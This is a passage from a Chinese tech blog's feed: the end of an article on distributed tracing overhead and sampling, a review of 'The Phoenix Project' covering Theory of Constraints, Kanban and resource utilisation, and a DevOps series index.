<h2 id="管理负载-Managing-Tracing-Overhead"><a href="#管理负载-Managing-Tracing-Overhead" class="headerlink" title="管理负载 Managing Tracing Overhead"></a>管理负载 Managing Tracing Overhead</h2><p>目前多数分布式追踪系统采用异步写入日志、建立缓冲存储（基于内存或者内存数据库）、设置采样阈值策略（包括一定情况下直接丢弃）的方式控制追踪负载。Google Dapper 公布的性能损耗测评数据如下：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-Dapper-Overhead-1.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-Dapper-Overhead-2.jpg" alt=""></p>
<p><strong>淘宝 EagleEye</strong> ：1）专属日志输出实现，日志异步写入来避免 hang 住业务线程，可调节日志输出缓冲大小，控制每秒写日志的 IO 次数等。2）全局采样开关，在运行期控制调用链的采样率（根据 TraceId 来决定当前的这一次访问日志是否输出）。比如采样率被设置为 10，一部分调用链日志完全不输出，只有 hash(traceId) mod 10 的值等于0的日志才会输出。例如核心入口的调用量样本空间足够大（每日百万次以上级别），假设统计误差 0.1% ，即使开启1/10的采样总和误差也是可以接受的。</p>
<p><strong>微博 Watchman</strong>：如某个服务由于瞬时访问高峰，造成底层资源压力变大从而服务响应时间变长，控制策略可以根据设定随机丢弃后续的请求，如果情况加剧就会自动降级该服务，保证核心服务路径。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="分布式追踪系统"><a href="#分布式追踪系统" class="headerlink" title="分布式追踪系统"></a>分布式追踪系统</h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</a></li>
<li><a href="https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/">DevOps 漫谈：分布式追踪系统标准体系</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h4 id="开源架构技术漫谈"><a href="#开源架构技术漫谈" class="headerlink" title="开源架构技术漫谈"></a>开源架构技术漫谈</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">DevOps 资讯 | LinkedIn 开源 Kafka Monitor</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://wu-sheng.gitbooks.io/opentracing-io/content/">OpenTraing 文档 | 中文 </a></li>
<li><a href="https://medium.com/opentracing/the-difference-between-tracing-tracing-and-tracing-84b49b2d54ea">The difference between tracing, tracing, and tracing</a></li>
<li><a href="https://medium.com/jaegertracing/using-opentracing-with-istio-envoy-d8a4246bdc15">Using OpenTracing with Istio/Envoy</a></li>
<li><a href="http://www.infoq.com/cn/articles/evolving-distributed-tracing-at-uber-engineering">优步分布式追踪技术再度精进</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/34318538">开放分布式追踪（OpenTracing）入门与 Jaeger 实现</a></li>
<li><a href="https://github.com/jaegertracing/jaeger">Github | CNCF Jaeger, a Distributed Tracing System</a></li>
<li><a href="https://sematext.com/blog/opentracing-jaeger-as-distributed-tracer/?utm_source=getresponse&amp;utm_medium=email&amp;utm_campaign=devopslinks&amp;utm_content=DevOpsLinks+%23112:+Jenkins+Scripted+Pipelines,+The+State+Of+Stateful+Apps+on+K8S+%26+Never+Write+Your+Own+Database">OpenTracing: Jaeger as Distributed Tracer</a></li>
<li><a href="https://medium.com/@Pinterest_Engineering/distributed-tracing-at-pinterest-with-new-open-source-tools-a4f8a5562f6b">Distributed tracing at Pinterest with new open source tools</a></li>
<li><a href="https://medium.com/devthoughts/instrumenting-a-go-application-with-zipkin-b79cc858ac3e">Instrumenting a Go application with Zipkin</a></li>
<li><a href="http://manzhizhen.iteye.com/blog/2348175">分布式跟踪系统（一）：Zipkin的背景和设计</a></li>
<li><a href="http://ginobefunny.com/post/learning_distributed_systems_tracing/">分布式调用跟踪系统调研笔记</a></li>
<li><a href="https://www.youtube.com/watch?v=Fbhhc4jtGW4&amp;feature=youtu.be">Node.js Performance and Highly Scalable Micro-Services - Chris Bailey, IBM</a></li>
<li><a href="https://tech.meituan.com/mt-mtrace.html">分布式会话跟踪系统架构设计与实践 | 美团点评技术团队 | 志桐 ·2016-10-14 18:13</a></li>
<li><a href="http://peter.bourgon.org/blog/2017/02/21/metrics-tracing-and-logging.html">Metrics, tracing, and logging | 2017 02 21</a></li>
<li><a href="https://blog.codingnow.com/2018/05/skynet_trace.html">跟踪 skynet 服务间的消息请求及性能分析 | 云风的Blog</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈：从作坊到工厂的寓言故事</title>
    <url>/2018/04/10/DevOps-Phoenix/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>背景：《凤凰项目》的灵魂</li>
<li>管理约束：最大的瓶颈是人</li>
<li>任务追踪：可视化工作区和看板实践</li>
<li>改进日常工作：预防性维护</li>
<li>反常识：系统里要经常出些故障、人力资源使用率与效率成反比</li>
<li>安全与审计</li>
<li>IT 价值流：像电力一样无处不在</li>
</ul>
<blockquote>
<p>转变主要不是基于自动化，相反，这种不可思议的改进来自于调整关于工作系统的策略和控制半成品的策略，确保有一个高效的跨职能团队，让所有事情都为约束点服务，以及管理好工作交接。——《凤凰项目 一个IT运维的传奇故事》</p>
</blockquote>
<span id="more"></span>
<p>谈到 DevOps 概念，有几本书是绕不过去的，《凤凰项目：一个IT运维的传奇故事》（The Phoenix Project:a Novel About IT,DevOps,and Helping Your Business Win）就是其中之一。本书的主要特色之一是将 IT 运营和工厂生产对应起来，借鉴制造业的经验提升 IT 价值。</p>
<h2 id="背景：《凤凰项目》的灵魂"><a href="#背景：《凤凰项目》的灵魂" class="headerlink" title="背景：《凤凰项目》的灵魂"></a>背景：《凤凰项目》的灵魂</h2><p>《凤凰项目》的作者金(Gene Kim);贝尔(Kevin Behr);斯帕福德(George Spafford)，显然是高德拉特的拥趸。在整个故事中都贯穿了高德拉特的思想——约束理论(限制理论，Theory of Constraints，TOC)。</p>
<blockquote>
<p>“不应该根据第一个工作站的效率来安排工作，而是根据瓶颈资源所能完成工作的速度来安排工作。”</p>
</blockquote>
<p>埃利亚胡·高德拉特博士（Eliyahu M. Goldratt，1947－2011），以色列物理学家，同时是一位企业管理领域的大师。1984年，高德拉特博士发表了他的重要著作《目标：一种持续改进的流程》（The Goal: A Process of On going Improvement），书中以小说的形式提出了约束理论。他主张一个复杂的系统隐含着简单化，即使在任何时间，一个复杂的系统可能是由成千上万人和一系列设备所组成，但是只有非常少的变数或许只有一个，称为限制，它会限制（或阻碍）此系统达到更高的目标。在此基础上，他进一步提出了在制造业经营生产活动中定义和消除制约因素的一些规范化方法以支持连续改进（Continuous Improvement），例如约束理论之外还提出了关键链（Critical Chain Project Management，CCPM）项目规划和管理方法（与关键路径分析方法不同，它主要侧重于项目执行中所需的资源，关注资源依赖，强调监测项目的进展和缓冲的使用率，而不是规划个别任务的进展速度）。精益生产或者丰田生产系统在某种程度上也是以约束理论为基础的。</p>
<p>回到《凤凰项目》，它的体裁是按照时间线叙事的日记体：临危受命的主人公一直致力于改善各个约束点（瓶颈）对于整个组织能力的限制。起初是一个无可替代的工程师，接着是应用程序部署流程，安全审计，最后约束点移到了技术部门之外，甚至包括外部供应商。简单来说，小说的脉络遵循实践约束理论的基本步骤：</p>
<ul>
<li>识别约束点；</li>
<li>利用约束点；</li>
<li>让所有其他活动都从属于约束点；</li>
<li>把约束点提升到新的水平；</li>
<li>寻找下一个约束点。</li>
</ul>
<h2 id="管理约束"><a href="#管理约束" class="headerlink" title="管理约束"></a>管理约束</h2><blockquote>
<p>“<strong>在瓶颈之外的任何地方作出的改进都是假象</strong>，在瓶颈之后作出任何改进都是徒劳的，而在瓶颈之前作出的任何改进则只会导致瓶颈处堆积更多的库存。” —— 艾利·高德拉特</p>
</blockquote>
<h4 id="最大的瓶颈是人"><a href="#最大的瓶颈是人" class="headerlink" title="最大的瓶颈是人"></a>最大的瓶颈是人</h4><p>如果希望通过这本书获得一些解决方案和技术细节的人估计要失望了，《凤凰项目》本质上是一本探讨如何提高组织效率的书，或者说主要是讨论人、顺带谈了一些协同方法论。</p>
<p>我相信很多人看完《凤凰项目》之后都会把故事里面里面一堆人物名字搞混，但是有一个角色甚至比较主角还有意思 —— 布伦特。个人能力超强，工作超努力，对各类技术细节了如指掌，所有大小项目大家都喜欢找他合作，有了问题也会第一时间想到他，典型的超级员工、英雄人物。与此同时，布伦特实际上并不像人们认为的那样聪明绝顶。他每天需要处理大量计划外工作，即使布伦特天天加班都完不成堆积如山的任务，最终造成了大量的任务积压，战略工作不断延期，管理层疲于应付各种投诉。我相信大多数发展中组织里面都会有这么一个角色存在。</p>
<p>新上任的主人公（比尔）将布伦特识别为 IT 生产环境中的约束点，并采取了更改工作流转的方式来避免布伦特被计划外工作打扰：</p>
<ul>
<li>与 CEO 达成共识，调整布伦特的工作职责：允许他拒绝除凤凰项目（战略级）以外的任何工作；</li>
<li>设置资源防火墙，任何人需要“征用”他都必须经过其部门领导评估优先级，所有资源请求通过层层过滤才能达到布伦特；</li>
<li>围绕布伦特组建了一个二线梯队，负责学习他的工作经验、编写文档、甚至实现部分自动化，逐步替代布伦特处理任务，将布伦特从各种繁琐的事情中解放出来</li>
</ul>
<blockquote>
<p>可能他是故意让自己显得无可或缺，以免其他人抢了他的工作。… 是不是布伦特把他的知识看作一种权力。也许他身上的某些部分不愿意把那些知识交出来。这也确实让他成为了几乎难以取代的人。——《凤凰项目 一个IT运维的传奇故事》 第 107 页</p>
</blockquote>
<p>值得注意的是，新的决策在开始阶段需要承受了很大的压力。领导人需要对抗的是长期形成的工作惯性，俗话说“病来如山倒、病去如抽丝”，想要改变也不是一朝一夕就可以实现的，更不要说组织内部微妙的人事关系，稍有不慎就可能踩到雷，顺畅的内部沟通、群众看得到的改进效果可以帮助解决一部分问题，但是现实中也有不可避免的碰撞。所以说，流程变更实质是是组织文化重塑的一种形式，领导者的信任与合作必不可少。这方面也是本书比较有趣的地方。</p>
<p>经过一段时间的坚持，布伦特的工作效率大大提升，顺利完成了凤凰项目，并在后来发起的独角兽和独角鲸项目取得了成功。</p>
<h2 id="任务追踪"><a href="#任务追踪" class="headerlink" title="任务追踪"></a>任务追踪</h2><p>凤凰项目故事中，主人公面对的困境是：IT 团队因为大量工作积压而导致各种任务延期。</p>
<blockquote>
<p>这个世界一定是哪里不对劲了，一半邮件都是紧急邮件。所有事情都那么重要，这可能吗？</p>
</blockquote>
<p>经过一番梳理，IT 团队的各类工作内容大致可以分为以下四种类别：</p>
<ul>
<li>第一类：业务项目，由 PMO 跟踪的正式项目；</li>
<li>第二类：IT 内部项目，由业务项目衍生的基础架构项目，或者改进项目；（* 生产能力投放度量）</li>
<li>第三类：变更（* 跨团队交接和重复跟踪）</li>
<li>第四类：计划外工作（救火工作）</li>
</ul>
<p>计划外工作可不是免费的，恰恰相反，它非常昂贵。在故事的第一部分，计划外工作是最主要的困扰，它们包括突发严重故障、业务安全漏洞引发的舆论风波、部分领导人基于个人意愿追加的临时项目等等。如果要推动战略项目的进度，<strong>必须根除计划外工作的最大源头！</strong></p>
<blockquote>
<p>计划外工作会让你丧失开展计划内工作的能力，因此必须不惜一切代价去消灭计划外工作，墨菲法则确实存在，因此总会有计划外工作，但你必须高效地处理它们。</p>
<p>第一优先级是谁喊得最响，决定因素是谁能搬出最大的领导来。我见过很多员工总是优先为某个经理服务，因为他每月带他们出去吃一次午餐。</p>
</blockquote>
<p>为了改变这一局面，主人公采用了一种“可视化工作区+任务追踪系统”的方式管理变更。</p>
<h2 id="任务可视化"><a href="#任务可视化" class="headerlink" title="任务可视化"></a>任务可视化</h2><p>可视化的目的是为了做到充分的交流，就像风吹过树林，不分彼此的摇动每一片树叶。</p>
<h4 id="可视化工作区"><a href="#可视化工作区" class="headerlink" title="可视化工作区"></a>可视化工作区</h4><p>运营中心（NOC）：一个巨大的开放式办公区域，靠一面墙放着一排长桌，巨大的显示器上显示着所有IT服务的各种状态。1级和2级客服人员占据了工作站的三排位置。“这并不是阿波罗13号的太空飞行指挥中心，但我就是这样向亲戚们解释我的工作环境的。”</p>
<p>在 NOC 运作的具体支撑手段上，高度重视看板墙（Kanban）的作用。</p>
<p>看板(Kanban)是一种生产管理系统，起源于1940年代的丰田汽车公司。看板的核心理论是基于制造业中经常提到的概念：库存。与传统会计观念不同，丰田认为库存会带来成本以及浪费，而不是增加或储存价值，应鼓励逐步消除库存，以便削减生产流程中的成本，在管理中逐渐适应“零库存”的状态。1961 年 MIT（Sloan School of Management）教授 John Little 正式提出了利特尔法则（ Little’s Law ）：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。</p>
<p><strong>Cycle Time = Work in Progress / Throughput</strong></p>
<p>根据利特尔法则，跟踪工作及进展的最重要的目标是：限制在制品（Work in process，WIP），例如尚未完成制造过程的商品，或是停留在库存仓库或是产线上，等待着进一步处理的商品。在 IT 语境中，半成品一般意味着积压的开发任务、等待启动的“重要不紧急”工作、“开发完成”但是未上线发布的新功能、等待执行的线上变更等等。</p>
<blockquote>
<p>看板上的索引卡片是做成这件事最好的机制之一，因为每个人都能看到半成品。—— 《凤凰项目 一个IT运维的传奇故事》第 151 页</p>
</blockquote>
<p>本书中关于看板（Kanban）实践的启示可以概括为以下几点：</p>
<ul>
<li>目标导向：相对于强化审批流程，更重要的是通过任务卡片的梳理识别半成品积压在哪个环节，通过建立一条反馈环路能够一直往回通向产品定义、设计及开发的最初环节。</li>
<li>简洁性：例如一张变更索引卡片只要求填写必需的三条信息：变更计划的制定者、将要实施变更的系统以及一条一句话的概述，避免设置过多的必填字段和无效选项。繁琐而缺乏人性考量的工具难以发挥作用，最终将变成 “大家为了完成自己的工作，一直在胡乱对付这套系统”，再也没有比阻止人们去做他们理应做的事更能毁掉大家的热情和支持了。</li>
<li>灵活性：针对需要特别关注的问题可以采取灵活方式，不拘泥于死板格式。例如在第一部分首席工程师（布伦特）是一个阶段性瓶颈，各部门在提交卡片的时候就将“是否需要布伦特支援”作为必填信息，或者使用单独一种颜色的卡片。</li>
</ul>
<p><strong>控制半成品的能力不足，是造成长期性延误和质量问题的根源之一。</strong> <strong>“完成”的真正定义</strong> 并非开发部完成了编码，而是只有在代码经过充分测试并按设计在生产中运行时，代码才算“完成”。</p>
<p>关于变更管理，还有一些具体的实践方法值得借鉴：</p>
<ul>
<li>分级授权：可以把一部分变更审核委派给代理人</li>
<li>脆弱变更：列出了十大最脆弱的服务、应用程序和基础架构列表，可能会影响到其中任何一个的变更申请都将立刻标上记号，由 CAB 详细审查</li>
<li>标准变更（ITIL 名称）：对于之前已多次成功实施的变更，我们只需要提前批准就行。它们仍然需要提交，但可以不经过我们批准就安排操作日程。”</li>
<li>外部影响变更：对于‘复杂的中等变更’ 变更提交者有责任向可能受到影响的人员进行咨询并得到其认可，做完这些之后才可以将变更卡片送入审核流程。</li>
<li>禁止条款（透明化）：禁止未经授权的变更，禁止在服务中断期间出现未经公开的变更。</li>
</ul>
<h2 id="改进日常工作"><a href="#改进日常工作" class="headerlink" title="改进日常工作"></a>改进日常工作</h2><blockquote>
<p>改进日常工作比开展日常工作更重要。</p>
</blockquote>
<h4 id="预防性维护"><a href="#预防性维护" class="headerlink" title="预防性维护"></a>预防性维护</h4><blockquote>
<p>技术债务。它来自于走捷径，那在短时间内也许行得通。但是就像金融债务一样，久而久之，利息成本会越滚越高。如果一个部门没有付清它的技术债务，公司的每一份努力都将以计划外工作的形式来偿还那些技术债务的利息。p186</p>
</blockquote>
<p>如果你是一家跨国货运公司，你们用一百辆卡车组成的车队运送包裹，你们的一项公司目标就会是客户满意度和按时交货。一个影响按时交货的因素是车辆故障。车辆故障的一个关键起因是没有更换机油。那么，为了降低这个风险，你就要为车辆运营建立一个服务等级协议（SLA），每行驶五千英里就要更换一次机油。如果说按时交货是关键绩效指标（KPI），那么为了达到这个指标可以建立一个新的前瞻性KPI，比如说，已经按要求更换机油的车辆百分比。</p>
<p>对于 IT 组织来说，这一原则同样适用。</p>
<h2 id="两个反常识的概念"><a href="#两个反常识的概念" class="headerlink" title="两个反常识的概念"></a>两个反常识的概念</h2><h4 id="系统里要经常出些故障"><a href="#系统里要经常出些故障" class="headerlink" title="系统里要经常出些故障"></a>系统里要经常出些故障</h4><p>作者在书中提到一个观点：“系统里要经常出些故障，长此以往，再遇到困难就没有原来那么痛苦了。p216”  </p>
<p>1960 年代，工业制造领域提出了弹性制造系统（Flexible Manufacturing System，FMS）的概念。FMS 的理想是制造系统能够富有弹性（能够因应预期或不可预期的变更），又兼有自动化设备规模生产的特性，以满足顾客对于产品要求多样化的趋势。制造系统的弹性通常被分为两类：</p>
<ul>
<li>“机器弹性”：涵盖了系统制造新产品的应变能力和零件工序改变的应变能力；</li>
<li>“用途弹性”：同一组件可以使用不同机器设备而运行相同的工序之。</li>
</ul>
<p>于 IT 生产而言，就有了弹性系统，即面对各种不确定场景时（如基础存储设施故障，恶意攻击，依赖服务故障，网络超时、中断等等）都能够存活并且具备一定的自愈能力的系统。弹性系统的出发点是承认在规模化服务的场景下，故障是常态的、不可预测的，既然不可避免，就需要在系统的生命周期去主动管理它，可以主动地给系统不断施加一些压力，从而不断强化习惯并加以改进。</p>
<p><strong>Do not try to avoid failures !  Embrace them !</strong></p>
<p>具体策略方面，可以将改进周期设定为小段时间，例如每次为期两周，每期都实施一个小型的改进项目，例如周期性的服务中断演练。每次日常改进都需要覆盖“设计—检测—恢复—预防”的各个环节，只有不断重复才能建立信任感和透明度，对需要团队合作的事情来说尤其如此。</p>
<blockquote>
<p>建立起部落文化般的工作共识，这帮助我们比以往任何时候都能够更快地排除故障，而且，一旦真的需要把工作升级，也是可控而有序的。p263</p>
</blockquote>
<h4 id="人力资源使用率与效率成反比"><a href="#人力资源使用率与效率成反比" class="headerlink" title="人力资源使用率与效率成反比"></a>人力资源使用率与效率成反比</h4><p>每个人都需要空闲时间，或者说松弛时间。如果大家都没有松弛时间，半成品就会卡在系统里。或者更确切地说，卡在队列里，只是干等着。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DevOps-%E8%B5%84%E6%BA%90%E5%BF%99%E7%A2%8C%E7%99%BE%E5%88%86%E6%AF%94.png" alt="资源忙碌百分比"></p>
<p>图表说明：横坐标轴上是给定资源的忙碌百分比，纵坐标轴上是大致的等待时间（更确切地说是队列长度）。曲线的形状表明，当资源使用率超过80%时，等待时间就会直线上升。</p>
<p><strong>等待时间取决于资源使用率</strong>。如果一个资源的忙碌时间是50%，那么它的空闲时间也是 50%。等待时间就是50%除以50%，也就是一个时间单位（可以简化理解为 1 个小时）。另一方面，如果一个资源 90% 的时间是忙碌的，等待时间=90% /10%，也就是说至少 9 个小时。换言之，任务排队等待的时间，将是资源有 50% 空闲时的 9 倍。</p>
<p>例如，小说中的技术大拿（布伦特），30分钟的简单变更需要耗费几个星期才能完成。原因很简单，作为所有工作的瓶颈，布伦特的使用率一直是100%甚至超过100%，因此，每次交给他的工作都只能在队列里枯等，如果不进行加速或升级处置，就永远不会完成。</p>
<p>再进一步，如果简单任务实际需要 5 个以上交接步骤（分析、设计、程序、测试、发布、线上变更等），情况又会如何呢？假设所有工作中心都有 90% 的时间是忙碌的，由图上可知，在每一个工作中心的平均等待时间是 9 个小时。总共等待时间就是 5倍：45 个小时。高资源使用率带来的破坏性结果恐怕也就无需多言了。</p>
<p>因此，削减非必要人工环节、管理交接工作是提高资源周转率的关键。</p>
<h2 id="安全与审计"><a href="#安全与审计" class="headerlink" title="安全与审计"></a>安全与审计</h2><blockquote>
<p>信息安全部总是到处亮出他们的“尚方宝剑”，提出各种紧急要求，全然不顾这样做对其他部门造成的后果，因此我们有很多会议都不邀请他们参加。只要有他们在，事情肯定办不成。p35</p>
<p>一些最英明的审计师说，只有三种内部控制目标：确保财务报告的可靠性，符合法律法规，以及运营的效率和效果。就是这样。你和约翰所谈论的正是所谓‘COSO立方’（内部控制整合框架）的不同面。” p241</p>
</blockquote>
<p>本书故事中着重探讨了信息安全与审计工作，例如技术部门与内部审计部门的矛盾冲突、将安全审计置于开发构建过程之中等挺有意思的。这块比较复杂，以后再补充。</p>
<h2 id="IT-价值流：像电力一样无处不在"><a href="#IT-价值流：像电力一样无处不在" class="headerlink" title="IT 价值流：像电力一样无处不在"></a>IT 价值流：像电力一样无处不在</h2><blockquote>
<p>IT 不只是一个部门。相反，它就像电力一样无处不在。IT 是一种技能，就像能读会算一样。在无极限零部件公司，我们没有一个集中的阅读或计算部门——我们希望每一个雇员都多少掌握这些技能。理解技术能够做什么、不能做什么，已经成为这家公司里每个部门必须具备的一种核心竞争力。要是业务经理领导了一个不具备这种技能的团队或项目，他们就会失败。——《凤凰项目 一个IT运维的传奇故事》第 316 页</p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h4 id="凤凰项目作者推荐书单"><a href="#凤凰项目作者推荐书单" class="headerlink" title="凤凰项目作者推荐书单"></a>凤凰项目作者推荐书单</h4><ul>
<li>《The DevOps Cookbook》(开发运维指导书)</li>
<li><a href="https://book.douban.com/subject/6862062/">《持续交付：发布可靠软件的系统方法》</a></li>
</ul>
<h4 id="《目标：一种持续改进的流程》"><a href="#《目标：一种持续改进的流程》" class="headerlink" title="《目标：一种持续改进的流程》"></a>《目标：一种持续改进的流程》</h4><p>1984年，埃利亚胡·高德拉特博士撰写了他的重要著作《目标：一种持续改进的流程》（The Goal: A Process of On going Improvement）。这是一本苏格拉底式的小说，主人公是一位名叫亚历克斯·罗戈的工厂经理，他必须在90天内解决成本和按时交货的问题，否则他的工厂就要被关停。</p>
<p>高德拉特博士在他的后一本书 <strong>《绝不是靠运气》（It’s Not Luck）</strong> 中，阐述了他称之为“思维过程”的内容。那是一套了不起的方法论（但是多少有些难以做到，且往往见效缓慢），主要是教公司如何识别长期的核心冲突、了解现状、描述理想的未来状况，以及多种提高成功可能性的策划技巧。</p>
<ul>
<li>华盛顿州立大学网站“EM526 约束管理”（课程），<a href="http://public.wsu.edu/~engrmgmt/holt/em530/index.htm">http://public.wsu.edu/~engrmgmt/holt/em530/index.htm</a></li>
<li>学习“思维过程”的教科书《逻辑化思维过程》，作者H.威廉·德特曼博士。</li>
</ul>
<h4 id="《丰田管理：为了获得改进、适应性和优异业绩而管理员工》"><a href="#《丰田管理：为了获得改进、适应性和优异业绩而管理员工》" class="headerlink" title="《丰田管理：为了获得改进、适应性和优异业绩而管理员工》"></a>《丰田管理：为了获得改进、适应性和优异业绩而管理员工》</h4><ul>
<li>Toyota Kata : Managing People for Improvement , Adaptive nessand SuperiorResults</li>
</ul>
<h4 id="《团队领导的五大障碍：关于领导力的寓言》"><a href="#《团队领导的五大障碍：关于领导力的寓言》" class="headerlink" title="《团队领导的五大障碍：关于领导力的寓言》"></a>《团队领导的五大障碍：关于领导力的寓言》</h4><ul>
<li>The Five Dysfunction sofa Team : A Leader ship Fable</li>
<li>作者：帕特里克·兰西奥尼</li>
</ul>
<p>团队达成目标的一个核心诱因是信任缺失。在他的模型中，五大障碍被描述为：</p>
<ul>
<li>信任缺失——不愿在团队中显示弱点；</li>
<li>惧怕冲突——在充满激情的建设性辩论中寻求和谐的假象；</li>
<li>缺乏诚意——假意与团队的决策达成一致，形成模棱两可的公司氛围；</li>
<li>回避问责——面对员工的失职行为，逃避追责，降低了工作标准；</li>
<li>忽视结果——对个人成就、地位和自我价值的关注超过了对团队成功的关注。</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://book.douban.com/subject/26644070/">豆瓣|《凤凰项目|The Phoenix Project》</a></li>
<li><a href="http://ijyun.github.io/2016/04/23/phoenix-project.html">《凤凰项目》内容梳理|龙井的博客</a></li>
<li><a href="https://researchcenter.paloaltonetworks.com/2016/10/phoenix-project-novel-devops-helping-business-win/">The Cybersecurity Canon: The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win</a></li>
<li><a href="http://news.sciencenet.cn/htmlnews/2011/6/248411.shtm">以色列物理学家、约束理论创始人埃利亚胡·戈德拉特逝世 | 2011 年</a></li>
<li><a href="http://www.itdks.com/dakalive/detail/796">弹性工程-构建弹性系统|曾绿麟|美团</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>专题：DevOps 漫谈系列</title>
    <url>/2016/07/28/DevOps/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>DevOps 实践的本质是文化</li>
<li>持续交付</li>
<li>学习力</li>
<li>工程师的自我修养</li>
</ul>
<span id="more"></span>
<h2 id="Introduction-to-DevOps"><a href="#Introduction-to-DevOps" class="headerlink" title="Introduction to DevOps"></a>Introduction to DevOps</h2><p>“开发运维” 这个词最初是在2008年1由帕特里克·德布瓦和安德鲁·谢弗提出的，并于 2009 年因为约翰·阿斯帕尔瓦和保罗·哈蒙德那场著名的“每天超过10次部署：Flickr的开发与运维合作”演讲，在 Velocity 技术大会广为流传。</p>
<h2 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
